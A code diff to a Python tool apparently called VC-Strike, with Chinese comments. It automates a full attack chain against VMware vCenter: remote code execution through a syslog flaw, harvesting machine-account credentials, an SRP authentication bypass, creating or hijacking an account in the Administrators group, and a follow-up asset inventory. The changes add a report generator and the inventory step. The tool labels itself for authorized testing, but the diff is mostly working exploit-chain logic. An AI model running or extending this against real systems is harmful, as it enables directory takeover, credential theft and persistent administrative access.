@@ -4,10 +4,10 @@
   S0 指纹
   S1 59310 RCE（UDP 514 → TCP 514 → TLS 1514 依次尝试，全部一次性 cron）
   S2 凭据收集（机器账户 DN/密码 —— 目标端 lwregshell 原样输出、本地转义还原）
-  S3 目录接管，三条路按序尝试：
-       3a 机器账户 simple bind（LDAPS 636 → LDAP 389）      ← 来自 59310，首选
-       3b 59309 SRP 绕过（身份 = administrator@<S2 推导域>）
-       3c 59309 SRP 绕过（默认 vsphere.local；仅 59309 可达时）
+  S3 目录接管，两路按序尝试：
+       3a 机器账户 simple bind（LDAPS 636 → LDAP 389） ← 来自 59310，首选
+       3b 59309 SRP 绕过（身份 = administrator@<S2 推导域>；
+          推导失败时回退 vsphere.local）
   S4 账户落地（已存在 → 改密复用；否则新建 + 加入 Administrators）
   S5 验证交付（新账户 LDAP bind 回验 + Administrators 组成员确认）
   S6 登记清理 + 交付卡片
@@ -19,7 +19,7 @@ import time
 
 from .berldap import (connect_ldap, op_bind_simple, parse_bind_response,
                       op_search, op_add, op_modify, collect_search,
-                      parse_ldap_result, has_srp)
+                      parse_ldap_result)
 from .recon import probe_target
 from .srp59309 import srp_bypass_bind
 from .syslog59310 import rce_readback
@@ -88,7 +88,7 @@ def _rce_variants(host, port, proto, fp):
 
 class ChainResult:
     def __init__(self, ok, card, steps, upn=None, password=None, udn=None,
-                 via=None, elapsed=0):
+                 via=None, elapsed=0, host=None, identity=None):
         self.ok = ok
         self.card = card
         self.steps = steps
@@ -97,11 +97,44 @@ class ChainResult:
         self.udn = udn
         self.via = via
         self.elapsed = elapsed
+        self.host = host
+        self.identity = identity
+
+    def report_markdown(self):
+        """授权测试交付报告（Markdown）。"""
+        import time as _t
+        rows = ["| 阶段 | 结果 | 明细 |", "|---|---|---|"]
+        for name, s_ok, detail in self.steps:
+            rows.append("| %s | %s | %s |" % (
+                (name or "").replace("|", "\\|").replace("\n", " "),
+                "✅" if s_ok else "❌",
+                (detail or "").replace("|", "\\|")
+                .replace("\r", " ").replace("\n", " ")))
+        return "\n".join([
+            "# VC-Strike 全链路测试报告",
+            "",
+            "- 目标: %s" % (self.host or "?"),
+            "- 时间: %s" % _t.strftime("%Y-%m-%d %H:%M:%S"),
+            "- 结果: %s" % ("打通" if self.ok else "未打通"),
+            "- 路径: %s" % (self.via or "—"),
+            "- 耗时: %dm%02ds" % (self.elapsed // 60, self.elapsed % 60),
+            "- 输入身份: %s" % (self.identity or "—"),
+            "- 交付账户: %s" % (self.upn or "—"),
+            "",
+            "## 阶段明细", "",
+            *rows,
+            "",
+            "## 交付卡片", "",
+            "```", self.card, "```",
+            "",
+            "> 本报告由 VC-Strike 自动生成，仅用于授权测试交付。",
+        ])
 
 
 def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
               syslog_port=514, proto="udp", vami_port=5480, proxy=None,
-              rce_wait=200, log=lambda s: None, stop_flag=None):
+              rce_wait=200, log=lambda s: None, stop_flag=None,
+              inventory=True):
     """执行全链路。log 为输出回调；stop_flag 置位后在阶段边界退出。"""
     t0 = time.time()
     steps = []
@@ -158,7 +191,9 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
     # ---- S3: 目录接管 ----
     conn = None
     via = None
+    ident_used = None
     if dn and pw:
+        ident_used = dn                       # 机器账户 DN 即 bind 身份
         for p, tls in ((636, True), (389, False)):
             if stopped():
                 break
@@ -181,6 +216,7 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
                 log("[!] [S3a] %s:%d 失败: %r" % (host, p, e))
     if conn is None and use_59309 and not stopped():
         ident = "administrator@" + (domain or "vsphere.local")
+        ident_used = ident
         for p, tls in ((636, True), (389, False), (2020, False)):
             if stopped():
                 break
@@ -204,7 +240,8 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
                 "  原因     : 三条目录接管路径均失败（明细见上方与日志）\n"
                 "  建议     : 确认 389/636 可达；59310 侧检查 VAMI 回显端口；\n"
                 "             携带运行日志回传维护者" % host)
-        return ChainResult(False, card, steps, elapsed=int(time.time() - t0))
+        return ChainResult(False, card, steps, elapsed=int(time.time() - t0),
+                           host=host, identity=ident_used)
 
     # ---- S4: 账户落地 ----
     base = base_from_dn(dn) if dn else None
@@ -226,7 +263,8 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
         code, diag = parse_ldap_result(val)
         if code != 0:
             card = "✘ 未打通\n  账户 %s 已存在但改密失败 code=%s" % (udn, code)
-            return ChainResult(False, card, steps, elapsed=int(time.time() - t0))
+            return ChainResult(False, card, steps, elapsed=int(time.time() - t0),
+                           host=host, identity=ident_used)
         step("S4 复用既有账户", True, udn)
     else:
         conn.send_op(op_add(udn, [
@@ -240,7 +278,8 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
         if code != 0:
             card = ("✘ 未打通\n  创建用户失败 code=%s %s"
                     % (code, diag.decode("utf-8", "replace")[:120]))
-            return ChainResult(False, card, steps, elapsed=int(time.time() - t0))
+            return ChainResult(False, card, steps, elapsed=int(time.time() - t0),
+                           host=host, identity=ident_used)
         step("S4 创建用户", True, "%s（UPN %s）" % (udn, upn))
 
     conn.send_op(op_modify("cn=Administrators,cn=Builtin," + base,
@@ -282,6 +321,16 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
 
     ok = bind_ok and in_group
     elapsed = int(time.time() - t0)
+    inventory_text = ""
+    if ok and inventory:
+        # 影响力证明：用交付账户走官方 REST API 做只读资产盘点
+        log("[*] [S5+] vSphere 资产盘点（只读 REST API，443）…")
+        try:
+            from .mgmt import gather_inventory
+            inventory_text = gather_inventory(host, upn, password, timeout=15)
+            log("[+] 资产盘点完成:\n%s" % inventory_text)
+        except Exception as e:
+            log("[!] 资产盘点失败（不影响交付）: %r" % e)
     if ok:
         card = "\n".join([
             "✔ 全链路打通",
@@ -293,9 +342,11 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
             "  耗时     : %dm%02ds" % (elapsed // 60, elapsed % 60),
             "  清理     : ldapdelete '%s'（已登记 ⑥ 清理中心）" % udn,
         ])
+        if inventory_text:
+            card += "\n\n" + inventory_text
     else:
         card = ("✘ 部分完成\n  账户 %s（密码 %s）已落地但验证未全过，\n"
                 "  明细见上方步骤；可登录 https://%s/ui 手工确认" %
                 (upn, password, host))
     return ChainResult(ok, card, steps, upn=upn, password=password, udn=udn,
-                       via=via, elapsed=elapsed)
+                       via=via, elapsed=elapsed, host=host, identity=ident_used)
